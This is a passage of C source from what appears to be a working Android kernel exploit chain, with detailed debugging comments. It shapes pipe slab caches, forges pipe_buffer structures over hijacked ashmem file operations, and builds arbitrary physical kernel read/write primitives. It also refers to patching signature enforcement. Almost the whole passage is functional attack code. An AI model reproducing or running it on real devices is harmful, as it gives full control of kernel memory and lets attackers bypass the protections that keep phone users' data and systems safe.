     * page descriptor so the next forensics round can see who pins it
     * (inuse>0 = live objects on the page; frozen = mid-rotation). */
    uintptr_t head = direct_to_head_page(conv_fd, base);
    uint64_t wflags = kernel_read64(conv_fd, head + 0);
    uint64_t wmeta = kernel_read64(conv_fd, head + 0x28);
    uint64_t wfree = kernel_read64(conv_fd, head + 0x08);
    pr_info("phys wave stuck head=%016zx flags=%016llx meta=%016llx "
            "inuse=%u objects=%u frozen=%d freelist=%016llx\n",
            head, (unsigned long long)wflags, (unsigned long long)wmeta,
            (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
            (int)((wmeta >> 31) & 1u), (unsigned long long)wfree);
    /* owner-forensics REMOVED (reboots 7 and 10, e5d016e6/934a736c): a
     * cfgfs kernel read of a garbage owner dereferences an unmapped
     * linear-map hole and oopses -- even with a range check, the
     * physmap window [ffffff8000000000, ffffffe000000000) contains
     * holes.  Never read derived pointers; only page descriptors
     * (head+flags/meta) are proven safe here. */
    /* Fail fast: with the page still pinned in the slab the drain/reclaim
     * rounds below cannot flip it either (round11: owned=0 then 480+1024
     * pipe allocs all wasted while the dangling waiter stayed exposed).
     * Return 0 -> prepare fails -> attempt cap counts it -> clean abort. */
    pr_warning("pipe prepare: target not owned after waves; skip drain "
               "(fast fail)\n");
    free(wave_pids);
    return 0;
  }

  shape_pipe_cache();

  uint64_t sc_before_pipes = read_target_slab_cache(conv_fd, base);
  int pipe_flip = -1;
  size_t drain_used = 0;
  for (size_t i = 0; i < pipe_drain_cnt; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
    drain_used = i + 1;
    if ((i & 15) != 15)
      continue;
    uint64_t sc_now = read_target_slab_cache(conv_fd, base);
    if (pipe_flip < 0 && sc_now != 0 && sc_now != sc_before_pipes) {
      pipe_flip = (int)i;
      break;
    }
    if ((i & 127) == 127)
      pr_info("pipe drain i=%zu sc=%016llx\n", i, (unsigned long long)sc_now);
  }

  size_t reclaim_target = pipe_reclaim_cnt;
  if (pipe_flip >= 0) {
    reclaim_target = PIPE_OBJS_PER_SLAB;
  }
  size_t reclaim_used = 0;
  for (size_t i = 0; i < reclaim_target; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
    reclaim_used = i + 1;
    if ((i & 15) != 15 && i + 1 != reclaim_target)
      continue;
    if (pipe_flip >= 0)
      continue;
    uint64_t sc_now = read_target_slab_cache(conv_fd, base);
    if (pipe_flip < 0 && sc_now != 0 && sc_now != sc_before_pipes) {
      pipe_flip = (int)i;
      size_t fill = i + PIPE_OBJS_PER_SLAB;
      reclaim_target = fill < pipe_reclaim_cnt ? fill : pipe_reclaim_cnt;
    }
  }
  uint64_t sc_end = read_target_slab_cache(conv_fd, base);
  pr_info("pipe convert flip=%d drain=%zu reclaim=%zu sc0=%016llx "
          "sc_end=%016llx\n",
          pipe_flip, drain_used, reclaim_used,
          (unsigned long long)sc_before_pipes, (unsigned long long)sc_end);

  for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
    for (size_t i = 0; i < wave_sz; i++) {
      kill_child(wave_pids[w * wave_sz + i]);
    }
  }
  free(wave_pids);
  close(conv_fd);

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  resolve_pipe_counts();
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < pipe_drain_cnt; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    ks_child_no_atexit = 1;
    prctl(PR_SET_NAME, "pipe_prepare", 0, 0, 0);
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    close(result_pipe[1]);
    /* Prepare is done and this child no longer needs ANY inherited fd: the
     * fake-fops ones (inherited g_fops_probe_fd, the conv_fd dup inside
     * prepare, any route payload fds the parent had open at fork) are pure
     * liabilities from here on.  Drop every inherited fd NOW, while the
     * payload page is almost certainly still alive, so the later SIGKILL
     * exit cannot panic: chain end (main.c exit tail) or an abort kills
     * this child, do_exit -> exit_files -> filp_close walks the inherited
     * fake-fops fds, and if the payload page has since died it reads
     * f_op->flush/release as garbage (0x10) and jumps there -> panic
     * (pstore: pipe_prepare pc=0x10 lr=filp_close+0x54).  A clean fd table
     * makes that exit safe no matter when the page dies.  Only /dev/null
     * (opened below) and 0/1/2 survive. */
    for (int fd = 3; fd < 4096; fd++)
      close(fd);
    g_fops_probe_fd = -1; /* inherited global fd is now closed */
    int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
      dup2(null_fd, STDOUT_FILENO);
      dup2(null_fd, STDERR_FILENO);
      if (null_fd > STDERR_FILENO) {
        close(null_fd);
      }
    }
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    /* chain16: child death (SYSCHK/OOM/SIGKILL) leaves the result pipe
     * at EOF; pr_error here would exit(-1) the whole multi-threaded
     * process mid-window with no diagnostic.  Fail soft so the window
     * loop sees base=0, reaps the child, and aborts cleanly. */
    int st = 0;
    pid_t reaped = (child > 0) ? waitpid(child, &st, WNOHANG) : -1;
    pr_warning("pipe page child did not report base got=%zd child=%d "
               "reap=%d st=0x%x; failing prepare\n",
               got, (int)child, (int)reaped, st);
    return 0;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < pipe_drain_cnt; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_first_offset = 0;
  pipe_scan_first_private = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
        pipe_scan_first_offset = pb.offset;
        pipe_scan_first_private = pb.private;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= pipe_reclaim_cnt) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        (pb.flags != PIPE_BUF_FLAG_CAN_MERGE && pb.flags != 0) ||
        pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > pipe_reclaim_cnt) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

/*
 * The forged pipe_buffer only yields data if the kernel still honors the
 * reclaimed pipe page; when that page is gone (root-child teardown can
 * release it) the bare read()/write() blocks forever.  Observed run17b:
 * the chain froze inside patch_sig_enforce's first pipe_read64 right
 * after "root child result", with the whole process tree later killed by
 * the adb drop.  A short poll timeout turns that hang into a plain
 * failure the callers already handle.
 */
static ssize_t pipe_read_to(int rfd, void *out, size_t len) {
  struct pollfd pfd = {.fd = rfd, .events = POLLIN};
  if (poll(&pfd, 1, 500) <= 0)
    return -1;
  return read(rfd, out, len);
}

static ssize_t pipe_write_to(int wfd, const void *data, size_t len) {
  struct pollfd pfd = {.fd = wfd, .events = POLLOUT};
  if (poll(&pfd, 1, 500) <= 0)
    return -1;
  return write(wfd, data, len);
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = pipe_read_to(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = pipe_write_to(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

/*
 * Zero the ops pointer of every pipe_buffer-shaped slot on the reclaim slab.
 * forge_pipe_buffers_on_page overwrites ALL slots (belonging to different
 * reclaim pipes), so on process exit free_pipe_info() calls put_page() on the
 * forged vmemmap page pointers — wrong refcount on a kernel page -> oops ->
 * panic.  The kernel checks if (buf->ops) before release; NULL skips it.
 *
 * Uses the cfgfs path (kernel_read/write_data), NOT pipe_read/write64:
 * the pipe primitive saves the current buffer, forges, ops, then restores
 * the saved (still-forged) buffer — which would undo the clear.
 * Must be called while fops are still hijacked (before route end).
 */
int pipe_clear_forged_ops(int fd) {
  if (pipebuf_page_base == 0 || !is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
  int cleared = 0;
  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    uint64_t ops = 0;
    if (kernel_read_data(fd, pipebuf_page_base + off + 16, &ops,
                         sizeof(ops)) != (ssize_t)sizeof(ops)) {
      pr_warning("pipe clear ops read failed off=%zx\n", off);
      return 0;
    }
    if (ops == 0) continue;
    uint64_t zero = 0;
    if (kernel_write_data(fd, pipebuf_page_base + off + 16, &zero,
                          sizeof(zero)) != (ssize_t)sizeof(zero)) {
      pr_warning("pipe clear ops write failed off=%zx ops=%llx\n", off,
                 (unsigned long long)ops);
      return 0;
    }
    cleared++;
  }
  pr_info("pipe cleared forged ops count=%d base=%016zx\n", cleared,
          pipebuf_page_base);
  return 1;
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = pipe_read_to(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = pipe_write_to(pipe_fds_reclaim[pipebuf_pipe_idx][1], data,
                                  len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  ks_diag_fd("physrw enter", fd);
  ks_diag_table("physrw enter");
  uintptr_t guard_prev_expect = 0;
  int guard_disarmed = 0;
  if (pipebuf_page_base == 0) {
    /* chain9: if the table is already dead (e.g. retry after a lost
     * window), do not re-enter the prepare window with the guard live —
     * it would jump the dead table on its next read. */
    uint64_t tbl_pre = 0;
    uint64_t want_ioctl = (uint64_t)text_addr(ASHMEM_IOCTL);
    int tr_pre = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
                                   want_ioctl, &tbl_pre, 150);
    if (tr_pre < 0 || tbl_pre != want_ioctl) {
      int q_probe = -1;
      ioctl(reclaim_recv_fd(), SIOCINQ, &q_probe);
      pr_warning("phys prepare skipped: payload table dead tbl=%llx rv=%d "
                 "queue=%d; abort before gate\n",
                 (unsigned long long)tbl_pre, tr_pre, q_probe);
      fops_guard_set_expect(0);
      return 0;
    }
    /* The payload page can legitimately flip inside the pipe-prepare
     * window (chain9: guard saw ENOTTY then pc=0x5).  Idle the guard for
     * the window; the post-prepare table check below re-arms it only if
     * the content survived. */
    guard_prev_expect = fops_guard_get_expect();
    if (guard_prev_expect) {
      fops_guard_set_expect(0);
      guard_disarmed = 1;
    }
    atomic_store(&pipe_prepare_done, 0);
    /* chain13: snapshot queue+nonce right before the child fork -- if the
     * queue is already drained here the drain happened during CFI/route,
     * not in the window; nonce still matching means content was alive at
     * window entry. */
    {
      int q0 = -1;
      uint64_t nn0 = 0;
      int nr0 = ks_fetch64(fops_table_base() + 0x100, &nn0);
      ioctl(reclaim_recv_fd(), SIOCINQ, &q0);
      pr_info("win enter q0=%d nonce=%llx nr=%d tbl=%llx\n", q0,
              (unsigned long long)nn0, nr0,
              (unsigned long long)tbl_pre);
    }
    atomic_store(&pipe_prepare_request, 1);
    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    int stack_dumped = 0;
    int tbl_dead_logged = 0;
    int last_tick_s = -1;
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(100000);
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      long elapsed = (now.tv_sec - t0.tv_sec);
      /* dense content sampling across the window: pins down the exact
       * moment object0 gets rotated by a mm fork (first-death log).
       * SIOCINQ on the reclaim receive end tells whether the payload
       * skbs still pin the page; base_events counts pfn-free hits. */
      if (!tbl_dead_logged) {
        uint64_t tbl_now = 0;
        /* The payload page can be TRANSIENTLY OFFLINE for a few ms
         * (page-cache eviction / migration, far more frequent on a fresh
         * boot) -- pipe.c:163-174.  A single ks_fetch64 would misread that
         * blip as a dead page and pollute the dead-dump path; poll until
         * only a sustained absence trips the dead log.  3 tries (60ms) was
         * still too short: fresh boots held the blip for seconds and the
         * three-run ENOTTY streak (win dead at +.3s / child dead before
         * conv) died here every time.  150 tries ~= 3s grace; a truly dead
         * page (skb purged, table zeroed) fails every try. */
        int tv = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
                                   (uint64_t)text_addr(ASHMEM_IOCTL),
                                   &tbl_now, 150);
        if (tv < 0 || tbl_now != (uint64_t)text_addr(ASHMEM_IOCTL)) {
          tbl_dead_logged = 1;
          uint64_t nn = 0;
          int nr = ks_fetch64(fops_table_base() + 0x100, &nn);
          int q = -1;
          ioctl(reclaim_recv_fd(), SIOCINQ, &q);
          int ev = ks_watch_frees_events();
          pr_warning("window table dead at +.%lds tbl=%llx rv=%d "
                     "nonce=%llx nr=%d skbrxq=%d base_events=%d\n",
                     elapsed, (unsigned long long)tbl_now, tv,
                     (unsigned long long)nn, nr, q, ev);
          /* app-domain page-death probes (2026-10-22: dead at +5~7s in
           * 2/2 app-uid rounds vs 25s+ alive in shell; dead dump reads
           * fail with ENOTTY so the writer fingerprint is unreadable).
           *   peek: MSG_PEEK the reclaim receive queue without consuming
           *     -- rv>0 == our pinned skb's data is still there (page
           *     alive => the failure is the cfgfs channel / f_op), EAGAIN
           *     == the queue byte is not ours (skb gone => page freed).
           *   fresh: a NEW /dev/ashmem open probes the misc fops pointer
           *     state -- ENOTTY == misc.fops still routes to the fake
           *     table (whose ioctl slot is zeroed), success == the
           *     pointer was restored/replaced. */
          char pk[8] = {0};
          errno = 0;
          ssize_t pk_rv = recv(reclaim_recv_fd(), pk, sizeof(pk),
                               MSG_PEEK | MSG_DONTWAIT);
          int pk_err = errno;
          int tfd = open("/dev/ashmem", O_RDWR);
          int tioctl = -1, terrno = 0;
          if (tfd >= 0) {
            errno = 0;
            tioctl = ioctl(tfd, ASHMEM_SET_NAME, "");
            terrno = errno;
            close(tfd);
          }
          pr_warning("win dead probe: peek rv=%zd errno=%d b0=%02x | "
                     "fresh ashmem fd=%d ioctl=%d errno=%d\n",
                     pk_rv, pk_err, (unsigned)(unsigned char)pk[0], tfd,
                     tioctl, terrno);
          /* pattern dump across object0 (fake_fops .. +0x200): all-zero
           * = page/mm memset, 0x50-fill = pipe child sendmsg capture,
           * mm-ish fields = live mm_struct alloc -- identifies the writer */
          for (int di = 0; di < 8; di++) {
            uint64_t w = 0;
            int wv = ks_fetch64(fops_table_base() + (uintptr_t)di * 0x40, &w);
            pr_warning("win dead dump +%x = %llx rv=%d\n",
                       (unsigned)(di * 0x40), (unsigned long long)w, wv);
          }
        }
      }
      if (elapsed != last_tick_s) {
        last_tick_s = (int)elapsed;
        int q = -1;
        ioctl(reclaim_recv_fd(), SIOCINQ, &q);
        pr_info("win tick +%lds skbrxq=%d base_events=%d dead=%d\n", elapsed,
                q, ks_watch_frees_events(), tbl_dead_logged);
      }
      if (pipe_prepare_child > 0) {
        int st = 0;
        pid_t got = waitpid(pipe_prepare_child, &st, WNOHANG);
        if (got == pipe_prepare_child) {
          pr_warning("pipe prepare child DIED status=%d elapsed=%lds\n", st,
                     elapsed);
          pipe_prepare_child = -1;
          break;
        }
      }
      if (!stack_dumped && elapsed >= 5 && pipe_prepare_child > 0) {
        char path[64], buf[2048];
        snprintf(path, sizeof(path), "/proc/%d/stack",
                 (int)pipe_prepare_child);
        int sfd = open(path, O_RDONLY);
        int n = 0;
        if (sfd >= 0) {
          n = read(sfd, buf, sizeof(buf) - 1);
          close(sfd);
        }
        if (n > 0) {
          buf[n] = 0;
          for (int i = 0; i < n; i++)
            if (buf[i] == '\n')
              buf[i] = '|';
          pr_info("pipe child stack fd=%d %s\n", sfd, buf);
        } else {
          pr_info("pipe child stack unreadable errno=%d\n", errno);
        }
        char wpath[64], wbuf[128];
        snprintf(wpath, sizeof(wpath), "/proc/%d/wchan",
                 (int)pipe_prepare_child);
        int wfd = open(wpath, O_RDONLY);
        int wn = 0;
        if (wfd >= 0) {
          wn = read(wfd, wbuf, sizeof(wbuf) - 1);
          close(wfd);
        }
        if (wn > 0) {
          wbuf[wn] = 0;
          pr_info("pipe child wchan=%s", wbuf);
        }
        stack_dumped = 1;
      }
      if (elapsed >= 120) {
        pr_warning("pipe prepare timeout elapsed=%lds; abort\n", elapsed);
        break;
      }
    }
  }
  if (pipebuf_page_base == 0) {
    pr_warning("phys prepare produced no page; abort before gate\n");
    return 0;
  }
  ks_diag_fd("physrw post-prepare", fd);
  ks_diag_table("physrw post-prepare");
  {
    uint64_t tbl_ioctl = 0;
    uint64_t want_ioctl = (uint64_t)text_addr(ASHMEM_IOCTL);
    int tr = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
                               want_ioctl, &tbl_ioctl, 150);
    if (tr < 0 || tbl_ioctl != want_ioctl) {
      uint64_t nb1 = 0, nb2 = 0;
      ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF + 8, &nb1);
      ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF + 16, &nb2);
      pr_warning("phys window lost payload page tbl=%llx want=%llx rv=%d "
                 "near=%llx/%llx; abort before gate\n",
                 (unsigned long long)tbl_ioctl, (unsigned long long)want_ioctl,
                 tr, (unsigned long long)nb1, (unsigned long long)nb2);
      return 0;
    }
  }
  /* Content proven alive: hand the guard back its expect so the gates
   * below keep misc.fops converged.  On the loss path above the guard
   * stays idle (disarm is only undone here). */
  if (guard_disarmed && guard_prev_expect) {
    fops_guard_set_expect(guard_prev_expect);
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    pr_info("phys step gate pages n1k=%016zx n2k=%016zx c1k=%016zx c2k=%016zx "
            "hitslot=%d\n",
            kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
            kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
            pipe_cache_slot_hit);
    for (size_t i = 0; i < sizeof(pipe_page_slab_cache) /
                                sizeof(pipe_page_slab_cache[0]);
         i++) {
      pr_info("phys step page[%zu] cache=%016zx type=%08x\n", i,
              pipe_page_slab_cache[i], pipe_page_type[i]);
    }
    pr_info("phys step pipebuf_page_base=%016zx\n", pipebuf_page_base);
    if (pipebuf_page_base != 0) {
      uintptr_t head = direct_to_head_page(fd, pipebuf_page_base);
      uint64_t flags = kernel_read64(fd, head + 0);
      uint64_t meta = kernel_read64(fd, head + 0x28);
      pr_info("phys step head=%016zx flags=%016llx meta=%016llx inuse=%u "
              "objects=%u frozen=%d\n",
              head, (unsigned long long)flags, (unsigned long long)meta,
              (unsigned)(meta & 0xffffu),
              (unsigned)((meta >> 16) & 0x7fffu),
              (int)((meta >> 31) & 1u));
      static const struct {
        const char *name;
        uintptr_t off;
      } ident[] = {
        {"mm_cachep", 0x2e26db0ULL},
        {"skbuff_head_cache", 0x24fdd98ULL},
        {"skbuff_fclone_cache", 0x24fdd90ULL},
        {"task_struct_cachep", 0x2e26db8ULL},
